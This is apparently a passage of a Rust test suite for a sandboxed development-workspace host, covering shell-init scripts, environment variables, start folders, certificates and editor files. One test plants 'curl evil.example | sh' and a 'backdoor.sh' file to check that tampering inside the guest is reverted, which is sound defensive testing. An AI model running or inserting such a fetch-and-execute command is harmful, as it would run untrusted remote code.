    let checks = rig.guest.checks.lock().unwrap().clone();
    assert_eq!(checks.len(), 1, "{checks:?}");
    assert_eq!(
        checks[0].1.as_deref(),
        Some("echo loud\n"),
        "the folder is mounted read-only in the guest"
    );
    let problems = problems_of(&api).await;
    let found = problems.iter().find(|p| p.0 == "shell-init:acme");
    assert!(found.is_some(), "{problems:?}");
    let found = found.unwrap();
    assert_eq!(found.1.as_deref(), Some("acme"));
    assert!(found.3.contains("It printed: loud"), "{found:?}");

    // Fixing it clears the problem at the next start.
    *rig.guest.check_answer.lock().unwrap() = None;
    put_shell_init(&api, "acme", "export A=1\n").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        problems_of(&api)
            .await
            .iter()
            .all(|p| p.0 != "shell-init:acme")
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_that_finds_the_shell_init_changed_from_inside_puts_it_back_and_tells_the_user() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    put_shell_init(&api, "acme", "export A=1\n").await;
    eventually("published", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some("export A=1\n".to_owned())
    })
    .await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // What a writable mount would let the guest do: change the file and add another.
    let folder = shell_init_folder(&rig, "acme");
    std::fs::write(folder.join("init.sh"), "curl evil.example | sh\n").unwrap();
    std::fs::write(folder.join("backdoor.sh"), "x").unwrap();
    api.post("/api/workspaces/acme/start", "").await;
    events
        .until(
            is_event("workspace_shell_init_restored", "acme"),
            Duration::from_secs(20),
        )
        .await;
    // The start goes on to finish: the notice is not an error.
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        std::fs::read_to_string(folder.join("init.sh")).unwrap(),
        "export A=1\n"
    );
    assert!(!folder.join("backdoor.sh").exists());

    // The file that loads it was replaced in the guest: the boot hook says so, and so does the user.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    *rig.guest.boot_says.lock().unwrap() =
        "puddle-boot: replaced /etc/profile.d/02-puddle-shell-init.sh\n".to_owned();
    api.post("/api/workspaces/acme/start", "").await;
    events
        .until(
            is_event("workspace_shell_init_restored", "acme"),
            Duration::from_secs(20),
        )
        .await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // A start with nothing changed says nothing.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let from = events.seen.len();
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        events.seen[from..]
            .iter()
            .all(|e| e["type"] != "workspace_shell_init_restored"),
        "{:?}",
        &events.seen[from..]
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_list_and_one_workspace_say_what_the_volume_takes_when_the_runtime_knows() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // A runtime that cannot say leaves the field empty: the card shows the size alone.
    let list = api.get("/api/workspaces").await.json();
    assert!(list["workspaces"][0]["disk_used_mib"].is_null(), "{list}");

    rig.runtime.set_volume_used(
        &WorkspaceId::new("acme").unwrap().volume_name(),
        puddle_compute::DiskSize::mib(1536),
    );
    let list = api.get("/api/workspaces").await.json();
    assert_eq!(list["workspaces"][0]["disk_used_mib"], 1536, "{list}");
    let one = api.get("/api/workspaces/acme").await.json();
    assert_eq!(one["disk_used_mib"], 1536, "{one}");

    // A runtime that cannot list its volumes does not stop the list: the last value stays.
    rig.runtime
        .inject(Op::ListVolumes, Fault::once(disk_error("list volumes")));
    let list = api.get("/api/workspaces").await;
    assert_eq!(list.status, 200, "{}", list.body);
    assert_eq!(list.json()["workspaces"][0]["disk_used_mib"], 1536);

    // A workspace's own answer follows an operation without a list being asked for.
    rig.runtime.set_volume_used(
        &WorkspaceId::new("acme").unwrap().volume_name(),
        puddle_compute::DiskSize::mib(1700),
    );
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let one = api.get("/api/workspaces/acme").await.json();
    assert_eq!(one["disk_used_mib"], 1700, "{one}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entrypoint_that_failed_at_once_is_a_problem_until_a_start_where_it_did_not() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    *rig.guest.boot_says.lock().unwrap() =
        "puddle-boot: entrypoint exited with status 127: dockerd: not found\n".to_owned();
    create(&api, &mut events, "acme").await;
    let problem = host
        .problems()
        .list()
        .into_iter()
        .find(|p| p.key == "entrypoint:acme")
        .unwrap_or_else(|| panic!("no problem: {:?}", host.problems().list()));
    assert_eq!(problem.title, "The image's entrypoint in acme stopped");
    assert!(
        problem.detail.contains("status 127: dockerd: not found")
            && problem.detail.contains("/run/puddle/entrypoint.log"),
        "{}",
        problem.detail
    );
    assert_eq!(
        problem.workspace.as_ref().map(WorkspaceName::as_str),
        Some("acme")
    );

    // The next start, where it did not fail, takes the problem away.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        host.problems()
            .list()
            .iter()
            .all(|p| p.key != "entrypoint:acme"),
        "{:?}",
        host.problems().list()
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn deleting_a_workspace_removes_its_shell_init_and_the_folder() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    put_shell_init(&api, "acme", "export A=1\n").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(shell_init_folder(&rig, "acme").exists());
    let reply = api
        .delete(
            "/api/workspaces/acme",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(!shell_init_folder(&rig, "acme").exists());
    assert_eq!(host.store().shell_init(&name("acme")).unwrap(), None);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_changed_variable_reaches_the_login_shell_file_of_a_running_workspace_without_a_restart()
{
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let boots = rig.guest.boots();
    let (creates, starts, stops) = (
        calls_of(&rig, "Create"),
        calls_of(&rig, "Start"),
        calls_of(&rig, "Stop"),
    );

    put_env(
        &api,
        "/api/workspaces/acme/env/EDITOR",
        json!({"kind": "plain", "value": "vim"}),
    )
    .await;
    rig.guest.boots_reach(boots + 1).await;
    let file = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(file.contains("export EDITOR='vim'"), "{file}");

    // A global variable reaches it too, a secret as its stand-in and never its value, and a
    // removed one leaves the file.
    put_env(
        &api,
        "/api/env/NPM_TOKEN",
        secret_body(Some(REAL), &["registry.example.org"]),
    )
    .await;
    rig.guest.boots_reach(boots + 2).await;
    let stand_in = stand_in_of(&host, "acme", "NPM_TOKEN");
    let file = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(
        file.contains(&format!("export NPM_TOKEN='{stand_in}'")),
        "{file}"
    );
    assert!(!guest_has(&rig, REAL));
    assert_eq!(
        api.delete("/api/workspaces/acme/env/EDITOR", None)
            .await
            .status,
        204
    );
    rig.guest.boots_reach(boots + 3).await;
    let file = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(!file.contains("EDITOR"), "{file}");

    // Nothing was created, started or stopped for any of it.
    assert_eq!(
        (
            calls_of(&rig, "Create"),
            calls_of(&rig, "Start"),
            calls_of(&rig, "Stop")
        ),
        (creates, starts, stops)
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_check_that_cannot_run_is_not_a_verdict_on_the_script() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // Saving: the guest could not set the check up (exit 70). The script is not blamed: the save
    // is answered as unavailable and nothing is saved.
    *rig.guest.check_answer.lock().unwrap() = Some((70, ""));
    let saved = put_shell_init(&api, "acme", "export A=1\n").await;
    assert_eq!(saved.status, 503, "{}", saved.body);
    assert!(saved.body.contains("could not run"), "{}", saved.body);
    assert_eq!(
        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
        false
    );

    // Starting: the same failure is a problem on the workspace and the start goes on.
    *rig.guest.check_answer.lock().unwrap() = None;
    put_shell_init(&api, "acme", "export A=1\n").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    *rig.guest.check_answer.lock().unwrap() = Some((70, ""));
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    let problems = problems_of(&api).await;
    let found = problems.iter().find(|p| p.0 == "shell-init:acme");
    assert!(found.is_some(), "{problems:?}");
    assert!(found.unwrap().2.contains("could not check"), "{found:?}");
    host.shutdown().await;
}

/// Waits for the problem `key` to be there (or gone) in the problem list, and says what it is.
async fn problem_is(api: &Api, key: &str, present: bool) -> Option<(String, String)> {
    let mut found = None;
    for _ in 0..500 {
        found = problems_of(api)
            .await
            .into_iter()
            .find(|p| p.0 == key)
            .map(|p| (p.2, p.3));
        if found.is_some() == present {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert_eq!(found.is_some(), present, "the problem {key}: {found:?}");
    found
}

/// Puts a plain file where the workspace's shell init folder is (or was), so nothing can be
/// published there.
fn block_shell_init_folder(rig: &Rig, workspace: &str) -> PathBuf {
    let folder = shell_init_folder(rig, workspace);
    std::fs::remove_dir_all(&folder).unwrap();
    std::fs::write(&folder, "in the way").unwrap();
    folder
}

#[tokio::test(flavor = "multi_thread")]
async fn a_shell_init_that_cannot_reach_the_running_guest_is_a_problem_until_a_save_gets_through() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let folder = block_shell_init_folder(&rig, "acme");

    let saved = put_shell_init(&api, "acme", "export A=1\n").await;
    assert_eq!(saved.status, 200, "{}", saved.body);
    let (title, detail) = problem_is(&api, "shell-init-copy:acme", true)
        .await
        .unwrap();
    assert!(title.contains("acme's shell init"), "{title}");
    assert!(detail.contains("keeps the shell init it had"), "{detail}");

    std::fs::remove_file(&folder).unwrap();
    put_shell_init(&api, "acme", "export A=2\n").await;
    problem_is(&api, "shell-init-copy:acme", false).await;
    assert_eq!(
        std::fs::read_to_string(folder.join("init.sh")).unwrap(),
        "export A=2\n"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_that_cannot_write_the_shell_init_folder_fails_and_leaves_the_workspace_stopped() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let folder = block_shell_init_folder(&rig, "acme");

    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"]
            .as_str()
            .unwrap()
            .contains("acme's shell init"),
        "{end}"
    );

    std::fs::remove_file(&folder).unwrap();
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_change_to_the_variables_that_the_guest_cannot_take_says_so_and_keeps_the_change() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    put_env(
        &api,
        "/api/workspaces/acme/env/EDITOR",
        json!({"kind": "plain", "value": "vim"}),
    )
    .await;
    let failed = events
        .until(
            is_event("workspace_env_failed", "acme"),
            Duration::from_secs(20),
        )
        .await;
    let reason = failed["reason"].as_str().unwrap();
    assert!(
        reason.contains("the change is saved") && reason.contains("keep the old variables"),
        "{failed}"
    );
    let saved = api.get("/api/workspaces/acme/env").await;
    assert!(saved.body.contains("EDITOR"), "{}", saved.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_create_that_cannot_write_the_shell_init_folder_fails_and_leaves_nothing_behind() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let parent = shell_init_folder(&rig, "acme")
        .parent()
        .unwrap()
        .to_path_buf();
    std::fs::create_dir_all(parent.parent().unwrap()).unwrap();
    let _ = std::fs::remove_dir_all(&parent);
    std::fs::write(&parent, "in the way").unwrap();

    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    assert!(rig.runtime.list().await.unwrap().is_empty());

    std::fs::remove_file(&parent).unwrap();
    create(&api, &mut events, "acme").await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_variable_set_while_the_guest_boots_reaches_its_login_shells_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let store = host.store().clone();
    *rig.guest.during_boot.lock().unwrap() = Some(Box::new(move || {
        store
            .set_env(
                &puddle_store::EnvScope::Workspace(name("acme")),
                &puddle_store::EnvName::new("EDITOR").unwrap(),
                puddle_store::EnvDraft::plain("vim").unwrap(),
            )
            .unwrap();
    }));
    create(&api, &mut events, "acme").await;

    rig.guest.boots_reach(2).await;
    let file = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(file.contains("export EDITOR='vim'"), "{file}");
    host.shutdown().await;
}

/// A change made from another thread while the boot hook is still busy reaches the host's change
/// handler before the hook returns: at that moment the host has no entry for the sandbox yet.
fn during_the_next_boot_from_another_thread(rig: &Rig, change: impl FnOnce() + Send + 'static) {
    *rig.guest.during_boot.lock().unwrap() = Some(Box::new(move || {
        std::thread::spawn(change).join().unwrap();
        // Simulated busy boot hook: the change has landed before the hook returns.
        std::thread::sleep(Duration::from_millis(300));
    }));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_variable_set_before_the_first_boot_returns_reaches_the_guest_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let store = host.store().clone();
    during_the_next_boot_from_another_thread(&rig, move || {
        store
            .set_env(
                &puddle_store::EnvScope::Workspace(name("acme")),
                &puddle_store::EnvName::new("EDITOR").unwrap(),
                puddle_store::EnvDraft::plain("vim").unwrap(),
            )
            .unwrap();
    });
    create(&api, &mut events, "acme").await;

    rig.guest.boots_reach(2).await;
    let file = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(file.contains("export EDITOR='vim'"), "{file}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_variable_set_while_a_stopped_workspace_boots_again_reaches_the_guest_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let booted = rig.guest.boots();
    let store = host.store().clone();
    during_the_next_boot_from_another_thread(&rig, move || {
        store
            .set_env(
                &puddle_store::EnvScope::Workspace(name("acme")),
                &puddle_store::EnvName::new("EDITOR").unwrap(),
                puddle_store::EnvDraft::plain("vim").unwrap(),
            )
            .unwrap();
    });

    let start = api.post("/api/workspaces/acme/start", "").await;
    assert_eq!(start.status, 202, "{}", start.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;

    rig.guest.boots_reach(booted + 2).await;
    let restarted = pem_of(
        &rig.guest.plan_files(booted),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(!restarted.contains("EDITOR"), "{restarted}");
    let rerun = pem_of(
        &rig.guest.plan_files(booted + 1),
        "/etc/profile.d/01-puddle-env.sh",
    );
    assert!(rerun.contains("export EDITOR='vim'"), "{rerun}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_identity_attached_before_the_first_boot_returns_reaches_the_guest_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let store = host.store().clone();
    during_the_next_boot_from_another_thread(&rig, move || {
        attach_a_new_identity(&store, &name("acme"));
    });
    create(&api, &mut events, "acme").await;

    rig.guest.boots_reach(2).await;
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(pem_of(&files, "/etc/puddle/gitconfig").contains("name = \"Ada\""));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_plan_run_in_a_live_guest_tells_the_user_when_it_put_the_loader_back() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();

    *rig.guest.boot_says.lock().unwrap() =
        "puddle-boot: replaced /etc/profile.d/02-puddle-shell-init.sh\n".to_owned();
    host.store()
        .set_env(
            &puddle_store::EnvScope::Workspace(name("acme")),
            &puddle_store::EnvName::new("EDITOR").unwrap(),
            puddle_store::EnvDraft::plain("vim").unwrap(),
        )
        .unwrap();
    rig.guest.boots_reach(booted + 1).await;
    events
        .until(
            is_event("workspace_shell_init_restored", "acme"),
            Duration::from_secs(20),
        )
        .await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_boots_with_the_development_certificate_and_a_renewed_one_at_its_next_start() {
    let rig = Rig::new();
    rig.dev_cert.give();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    let first = rig.guest.boots() - 1;
    let plan = String::from_utf8(rig.guest.plan_bytes(first)).unwrap();
    let files = rig.guest.plan_files(first);
    // The certificate is public; the key is a file only root reads, and a step sets up .NET.
    assert!(plan.contains("puddle_file '/etc/puddle/dev-cert/localhost.key' 0600 "));
    assert!(plan.contains("puddle_file '/etc/puddle/dev-cert/localhost.crt' 0644 "));
    assert!(plan.contains("puddle_step '/usr/local/lib/puddle/dev-cert.sh'"));
    let cert = pem_of(&files, "/etc/puddle/dev-cert/localhost.crt");
    assert!(pem_of(&files, "/etc/puddle/dev-cert/localhost.key").contains("BEGIN PRIVATE KEY"));
    assert_eq!(
        pem_of(
            &files,
            "/usr/local/share/ca-certificates/puddle-dev/localhost.crt"
        ),
        cert
    );
    assert!(pem_of(&files, "/etc/puddle/extra-cas.pem").contains(&cert));
    let env = pem_of(&files, "/etc/profile.d/01-puddle-env.sh");
    for line in [
        "export DEV_CERT_PEM='/etc/puddle/dev-cert/localhost.crt'",
        "export DEV_KEY_PEM='/etc/puddle/dev-cert/localhost.key'",
        "export DOTNET_GENERATE_ASPNET_CERTIFICATE='false'",
    ] {
        assert!(env.contains(line), "{line} in {env}");
    }
    assert!(env.contains("export SSL_CERT_DIR='/root/.aspnet/dev-certs/trust:"));

    // After a renewal the next start (the guest boots again) carries the new certificate.
    rig.dev_cert.renew();
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let renewed = pem_of(
        &rig.guest.plan_files(rig.guest.boots() - 1),
        "/etc/puddle/dev-cert/localhost.crt",
    );
    assert_ne!(renewed, cert);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_without_a_development_certificate_writes_nothing_for_it_into_the_guest() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    let plan = String::from_utf8(rig.guest.plan_bytes(rig.guest.boots() - 1)).unwrap();
    for word in ["dev-cert", "puddle-dev", "DEV_CERT_PEM", "DOTNET_GENERATE"] {
        assert!(!plan.contains(word), "{word} in the plan");
    }
}

// ---- the start folder and the editor's target --------------------------------------------

async fn put_start_folder(api: &Api, workspace: &str, path: Option<&str>) -> support::Reply {
    api.put(
        &format!("/api/workspaces/{workspace}/start-folder"),
        &json!({ "path": path }).to_string(),
    )
    .await
}

fn last_plan(rig: &Rig) -> String {
    String::from_utf8(rig.guest.plan_bytes(rig.guest.boots() - 1)).unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_folder_reaches_the_login_shell_file_and_a_missing_one_is_a_problem_until_it_exists()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // No start folder: new terminals land in the volume root.
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let file = pem_of(&files, "/etc/profile.d/03-puddle-start-folder.sh");
    assert!(file.contains("cd '/workspaces/acme'"), "{file}");

    // The setting is checked, saved, and written into the running guest without a restart.
    let boots = rig.guest.boots();
    let set = put_start_folder(&api, "acme", Some("web/src")).await;
    assert_eq!(set.status, 200, "{}", set.body);
    assert_eq!(
        set.json(),
        json!({"start_folder": "web/src", "exists": true})
    );
    assert_eq!(rig.guest.boots(), boots + 1);
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let file = pem_of(&files, "/etc/profile.d/03-puddle-start-folder.sh");
    assert!(file.contains("cd '/workspaces/acme/web/src'"), "{file}");
    events
        .until(
            is_event("workspace_repositories_changed", "acme"),
            Duration::from_secs(20),
        )
        .await;
    let read = api.get("/api/workspaces/acme").await;
    assert_eq!(read.json()["start_folder"], "web/src");

    // A folder that is not there opens the root and is a problem; the setting still saves.
    rig.guest.start_folder_missing.store(true, Ordering::SeqCst);
    let set = put_start_folder(&api, "acme", Some("later")).await;
    assert_eq!(
        set.json(),
        json!({"start_folder": "later", "exists": false})
    );
    let (title, detail) = problem_is(&api, "start-folder:acme", true).await.unwrap();
    assert!(title.contains("later"), "{title}");
    assert!(detail.contains("volume root"), "{detail}");
    // It ends when the folder exists (an attach looks again) or the setting goes back to the root.
    rig.guest
        .start_folder_missing
        .store(false, Ordering::SeqCst);
    let attach = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "browser"}).to_string(),
        )
        .await;
    assert_eq!(attach.status, 200, "{}", attach.body);
    assert!(problem_is(&api, "start-folder:acme", false).await.is_none());
    rig.guest.start_folder_missing.store(true, Ordering::SeqCst);
    put_start_folder(&api, "acme", Some("later")).await;
    assert!(problem_is(&api, "start-folder:acme", true).await.is_some());
    let reset = put_start_folder(&api, "acme", None).await;
    assert_eq!(reset.json(), json!({"start_folder": null, "exists": null}));
    assert!(problem_is(&api, "start-folder:acme", false).await.is_none());

    // What breaks the rules is refused with the reason; an unknown workspace is a 404.
    for bad in ["../etc", "/abs", "a//b", ".puddle/x", "lost+found"] {
        let refused = put_start_folder(&api, "acme", Some(bad)).await;
        assert_eq!(refused.status, 422, "{bad}: {}", refused.body);
    }
    assert_eq!(put_start_folder(&api, "nope", None).await.status, 404);
    let saved = api.get("/api/workspaces/acme").await;
    assert_eq!(saved.json()["start_folder"], serde_json::Value::Null);
}

#[tokio::test(flavor = "multi_thread")]
async fn an_attach_writes_the_multi_root_file_for_two_checkouts_and_a_file_it_cannot_parse_is_a_problem()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let attach = || async {
        let reply = api
            .post(
                "/api/workspaces/acme/attach",
                &json!({"mode": "browser"}).to_string(),
            )
            .await;
        assert_eq!(reply.status, 200, "{}", reply.body);
    };
    let file = ".puddle/editor/acme.code-workspace";

    // One checkout, or none: the root opens and the plan holds no file.
    attach().await;
    assert!(!last_plan(&rig).contains(file));
    rig.guest
        .put_checkout("api", "https://example.org/acme/api.git");
    attach().await;
    assert!(!last_plan(&rig).contains(file));

    // Two, and a loose file: the plan merges `folders` into the file, one folder per checkout and
    // the volume root last.
    rig.guest
        .put_checkout("web", "https://example.org/acme/web.git");
    rig.guest.other_entries.store(2, Ordering::SeqCst);
    attach().await;
    let plan = last_plan(&rig);
    assert!(plan.contains(file), "{plan}");
    for folder in [
        "/workspaces/acme/api",
        "/workspaces/acme/web",
        "workspace files",
    ] {
        assert!(plan.contains(folder), "{folder}: {plan}");
    }
    // A start folder replaces the window: Puddle's lines go again.
    put_start_folder(&api, "acme", Some("api")).await;
    attach().await;
    assert!(!last_plan(&rig).contains(file));
    put_start_folder(&api, "acme", None).await;

    // A file the hook cannot parse is left alone and a problem names it, until it parses.
    *rig.guest.boot_says.lock().unwrap() =
        format!("puddle-boot: /workspaces/acme/{file} left as it is: expected a value at line 1\n");
    attach().await;
    let (_, detail) = problem_is(&api, "editor-file:acme", true).await.unwrap();
    assert!(detail.contains("left as it is"), "{detail}");
    attach().await;
    assert!(problem_is(&api, "editor-file:acme", false).await.is_none());
}

/// A workspace that runs, with nothing else going on in its guest.
async fn quiet_workspace(rig: &Rig, name: &'static str) -> (Host<FakeRuntime>, Api) {
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, name).await;
    after_boot_listing(rig).await;
    (host, api)
}

#[tokio::test(flavor = "multi_thread")]
async fn a_guest_that_cannot_look_for_the_start_folder_is_a_problem_until_it_can() {
    let rig = Rig::new();
    let (_host, api) = quiet_workspace(&rig, "acme").await;
    // The login-shell file is written (the first command); the look for the folder is the next.
    rig.runtime.inject(
        Op::Exec,
        Fault::once(disk_error("exec")).only_for("acme").after(1),
    );
    let set = put_start_folder(&api, "acme", Some("web")).await;
    assert_eq!(set.json(), json!({"start_folder": "web", "exists": null}));
    let (title, detail) = problem_is(&api, "start-folder:acme", true).await.unwrap();
    assert!(
        title.contains("could not look for") && title.contains("web"),
        "{title}"
    );
    assert!(detail.contains("no space left"), "{detail}");
    // The next look that works ends it.
    put_start_folder(&api, "acme", Some("web")).await;
    assert!(problem_is(&api, "start-folder:acme", false).await.is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_folder_the_guest_cannot_be_given_is_a_problem_until_a_change_reaches_it() {
    let rig = Rig::new();
    let (_host, api) = quiet_workspace(&rig, "acme").await;
    rig.runtime
        .inject(Op::Exec, Fault::once(disk_error("exec")).only_for("acme"));
    let set = put_start_folder(&api, "acme", Some("web")).await;
    assert_eq!(set.status, 200, "{}", set.body);
    let (title, detail) = problem_is(&api, "start-folder-file:acme", true)
        .await
        .unwrap();
    assert!(title.contains("start folder"), "{title}");
    assert!(
        detail.contains("no space left") && detail.contains("saved"),
        "{detail}"
    );
    put_start_folder(&api, "acme", Some("web/src")).await;
    assert!(
        problem_is(&api, "start-folder-file:acme", false)
            .await
            .is_none()
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_folder_changed_while_the_workspace_is_stopped_ends_the_problems_about_the_old_one()
{
    let rig = Rig::new();
    let (_host, api) = quiet_workspace(&rig, "acme").await;
    rig.runtime
        .inject(Op::Exec, Fault::once(disk_error("exec")).only_for("acme"));
    put_start_folder(&api, "acme", Some("web")).await;
    problem_is(&api, "start-folder-file:acme", true).await;
    rig.guest.start_folder_missing.store(true, Ordering::SeqCst);
    put_start_folder(&api, "acme", Some("web/src")).await;
    problem_is(&api, "start-folder:acme", true).await;
    let mut events = api.events().await;
    let stop = api.post("/api/workspaces/acme/stop", "").await;
    assert_eq!(stop.status, 202, "{}", stop.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    // Nothing in a stopped workspace can be looked at: the change ends both problems, and the
    // start that comes looks again.
    let set = put_start_folder(&api, "acme", Some("api")).await;
    assert_eq!(set.status, 200, "{}", set.body);
    assert!(problem_is(&api, "start-folder:acme", false).await.is_none());
    assert!(
        problem_is(&api, "start-folder-file:acme", false)
            .await
            .is_none()
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn an_attach_that_cannot_list_or_write_the_editors_file_says_so_until_one_works() {
    let rig = Rig::new();
    let (_host, api) = quiet_workspace(&rig, "acme").await;
    let attach = || async {
        let reply = api
            .post(
                "/api/workspaces/acme/attach",
                &json!({"mode": "browser"}).to_string(),
            )
            .await;
        assert_eq!(reply.status, 200, "{}", reply.body);
    };
    // The listing is the first command of an attach with no start folder, the plan the second.
    for skip in [0, 1] {
        rig.runtime.inject(
            Op::Exec,
            Fault::once(disk_error("exec")).only_for("acme").after(skip),
        );
        attach().await;
        let (title, detail) = problem_is(&api, "editor-file:acme", true).await.unwrap();
        assert!(title.contains("editor's file"), "{title}");
        assert!(detail.contains("no space left"), "{detail}");
        attach().await;
        assert!(problem_is(&api, "editor-file:acme", false).await.is_none());
    }
}

